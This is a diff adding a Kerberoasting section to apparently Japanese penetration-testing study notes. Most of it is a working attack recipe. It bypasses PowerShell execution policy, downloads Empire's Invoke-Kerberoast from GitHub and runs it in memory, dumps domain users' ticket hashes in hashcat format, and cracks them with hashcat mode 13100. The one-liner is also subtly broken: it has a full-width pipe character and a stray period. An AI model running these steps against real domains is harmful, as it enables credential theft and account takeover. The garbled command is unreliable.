@@ -260,3 +260,24 @@ KDCによる認証処理が完了し、クライアントがセッションキ�
     ```
 
 
+
+### Kerberoust
+
+https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+
+https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1?
+
+```bash
+python -m http.server 6666 -d /usr/share/powershell-empire/empire/server/data/module_source/credentials/
+```
+
+```powershell
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash｜out-file -Encoding ASCII kerb-Hash0.txt".
+```
+
+上記のコマンドでDCに登録されているユーザのハッシュを列挙できる。複数いる場合は`net user /domain <ユーザ名>`で権限を調べてからパスワードクラックに臨むとよい
+
+```
+hashcat65.exe -m 13100 hash.txt wordlist.txt outputfile.txt
+```
+
